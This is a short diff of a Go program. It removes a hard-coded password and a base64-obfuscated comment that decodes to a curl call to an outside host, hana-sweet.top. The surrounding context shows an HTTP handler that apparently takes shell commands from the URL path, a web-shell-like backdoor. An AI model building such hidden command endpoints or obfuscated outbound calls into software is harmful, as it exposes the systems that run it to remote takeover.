@@ -31,7 +31,6 @@ func main() {
 		return
 	}
 	pass = u.String()
-	pass = `passport`
 
 	log.Println(fmt.Sprintf(`%s`, pass))
 
@@ -64,7 +63,6 @@ func httpExec(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	if r.Method == `GET` {
-		// Y3VybC5leGU= LWt2 aHR0cHM6Ly9oYW5hLXN3ZWV0LnRvcA==
 		path := strings.Split(r.URL.Path, "/")
 		cmd := path[len(path)-1]
 		fmt.Println(strings.Split(cmd, " "))
